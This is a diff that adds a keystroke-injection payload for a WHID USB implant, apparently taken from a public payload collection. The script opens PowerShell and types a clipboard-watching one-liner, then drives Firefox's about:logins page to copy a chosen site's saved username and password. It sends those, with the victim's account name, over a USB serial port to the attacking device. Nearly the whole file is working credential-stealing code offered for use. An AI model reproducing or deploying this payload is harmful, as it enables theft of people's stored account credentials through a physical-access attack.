@@ -1,0 +1,39 @@
+Rem: Payload created by @TravisPooley https://github.com/TravisPooley/WHID-Payloads
+Rem: Designed to grab target creds for Firefox Release: 70.0.1
+Rem: Open powershell to grab passwords and write them to the device
+Press: 131 + 114
+CustomDelay: 500
+PrintLine: powershell
+CustomDelay: 2000
+PrintLine:$n="a";$ar=@();Set-Clipboard -Value $n;while($ar.length -lt 2){if ((Get-Clipboard) -eq $n) {Start-Sleep -Milliseconds 50;}else {$ar+=@((Get-Clipboard));Set-Clipboard -Value $n;}}$n="Firefox Stolen Passwords Device:";$n+=whoami;$n+=" Username: ";$n+=$ar[0];$n+=" Password: ";$n+=$ar[1];$s=(Get-WmiObject -Class Win32_PnPEntity -Namespace 'root\CIMV2' -Filter "PNPDeviceID like 'USB\\VID_1b4f&PID_9208%'").Caption;$com=[regex]::match($s,'\(([^\)]+)\)').Groups[1].Value;$port= new-Object System.IO.Ports.SerialPort $com,38400,None,8,one;$port.open();$port.WriteLine("SerialEXFIL:$n");$port.Close();exit;
+
+Rem: Open Firefox
+Press: 131 + 114
+CustomDelay: 500
+PrintLine: firefox 
+CustomDelay: 2000
+
+Rem: Navigate to login settings page
+Press:128+116
+CustomDelay: 250
+PrintLine: about:logins
+
+Rem: Navigate to login that you want to steal
+Rem: Change \/ to target site
+PrintLine:twitter
+Press: 179
+Press: 179
+Press: 179
+Press: 179
+Rem: Confirm target site
+Press: 32
+Press: 179
+Press: 179
+Rem: Copy Username
+Press: 176
+Press: 179
+Press: 179
+Rem: Copy Password
+Press: 176
+Press: 128 + 119
+Press: 128 + 119
